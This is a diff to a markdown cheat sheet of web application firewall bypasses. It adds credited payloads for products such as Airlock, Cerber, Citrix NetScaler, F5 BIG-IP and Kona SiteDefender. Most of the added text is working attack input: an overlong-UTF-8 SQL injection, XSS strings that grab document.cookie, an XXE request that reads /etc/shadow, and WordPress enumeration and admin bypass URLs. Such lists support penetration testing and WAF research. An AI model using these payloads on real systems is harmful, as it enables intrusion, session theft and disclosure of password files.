@@ -2333,6 +2333,12 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 `site:pastebin.com +<wafname> bypass`
 
 ## Known Bypasses:
+### Airlock Ergon
+- SQLi Overlong UTF-8 Sequence Bypass (>= v4.2.4) by [@Sec Consult](https://www.exploit-db.com/?author=1614)
+```
+%C0%80'+union+select+col1,col2,col3+from+table+--+
+```
+
 ### Barracuda 
 - Cross Site Scripting by [@WAFNinja](https://waf.ninja)
 ```
@@ -2353,8 +2359,27 @@ User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 - [Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40146) by [@xort](https://www.exploit-db.com/?author=479#)
 - [Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40147) by [@xort](https://www.exploit-db.com/?author=479)
 
+### Cerber (WordPress)
+- Username Enumeration Protection Bypass by HTTP Verb Tampering by [@ed0x21son](https://www.exploit-db.com/?author=9901)
+```
+POST host.com HTTP/1.1
+Host: favoritewaf.com
+User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
+
+author=1
+```
+- Protected Admin Scripts Bypass by [@ed0x21son](https://www.exploit-db.com/?author=9901)
+```
+http://host/wp-admin///load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utils
+http://host/wp-admin///load-styles.php?load%5B%5D=dashicons,admin-bar
+```
+- REST API Disable Bypass by [@ed0x21son](https://www.exploit-db.com/?author=9901)
+```
+http://host/index.php/wp-json/wp/v2/users/
+```
+
 ### Citrix NetScaler
-- SQLi via HTTP Parameter Pollution (NS10.5) [@BGA Security](https://www.exploit-db.com/?author=7396)
+- SQLi via HTTP Parameter Pollution (NS10.5) by [@BGA Security](https://www.exploit-db.com/?author=7396)
 ```
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
    <soapenv:Header/>
@@ -2366,7 +2391,7 @@ User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 
 - `generic_api_call.pl` XSS by [@NNPoster](https://www.exploit-db.com/?author=6654)
 ```
-/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
+http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
 ``` 
 
 ### Cloudflare
@@ -2485,14 +2510,14 @@ GET Type Query
 http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
 ```
 
-### __F5 ASM__ 
+### F5 ASM 
 - XSS Bypass by [@WAFNinja](https://waf.ninja)
 ```
 <table background="javascript:alert(1)"></table>
 "/><marquee onfinish=confirm(123)>a</marquee>
 ```
 
-### __F5 BIG-IP__ 
+### F5 BIG-IP
 - XSS Bypass by [@WAFNinja](https://waf.ninja/)
 ```
 <body style="height:1000px" onwheel="[DATA]">
@@ -2500,13 +2525,22 @@ http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
 <body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
 ```
+- [`report_type` XSS](https://www.securityfocus.com/bid/27462/info) by [@NNPoster](https://www.exploit-db.com/?author=6654)
+```
+https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+
+```
 - POST Based XXE by [@Anonymous](https://www.exploit-db.com/?author=2168)
 ```
-<?xml version="1.0" encoding='utf-8' ?>
+POST /sam/admin/vpe2/public/php/server.php HTTP/1.1
+Host: bigip
+Cookie: BIGIPAuthCookie=*VALID_COOKIE*
+Content-Length: 143
+
+<?xml  version="1.0" encoding='utf-8' ?>
 <!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]>
 <message><dialogueType>&e;</dialogueType></message>
 ```
-- F5 BIG-IP Directory Traversal by [@Anastasios Monachos](https://www.exploit-db.com/?author=2932)
+- Directory Traversal by [@Anastasios Monachos](https://www.exploit-db.com/?author=2932)
 
 Read Arbitrary File
 ```
@@ -2565,6 +2599,16 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
 ```
 - [Imperva SecureSphere <= v13 - Privilege Escalation](https://www.exploit-db.com/exploits/45130) by [@0x09AL](https://www.exploit-db.com/?author=8991)
+
+### Kona SiteDefender
+- XSS Bypass by [@zseano](https://twitter.com/zseano)
+```
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+```
+- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
+```
+ <d3v/onauxclick=[2].some(confirm)>click 
+```
 
 ### Profense
 - [GET Type CSRF Attack](https://www.exploit-db.com/exploits/7919) by [@Michael Brooks](https://www.exploit-db.com/?author=628) (>= v.2.6.2)
@@ -2643,18 +2687,12 @@ Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
-### __IIS__ 
+### IIS
 - Tabs before method by [@i_bo0om](http://twitter.com/i_bo0om)
 ```
     GET /login.php HTTP/1.1
 Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
-```
-
-### __Kona SiteDefender__
-- XSS Bypass by [@zseano](https://twitter.com/zseano)
-```
-?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
 
 ## Awesome Tools
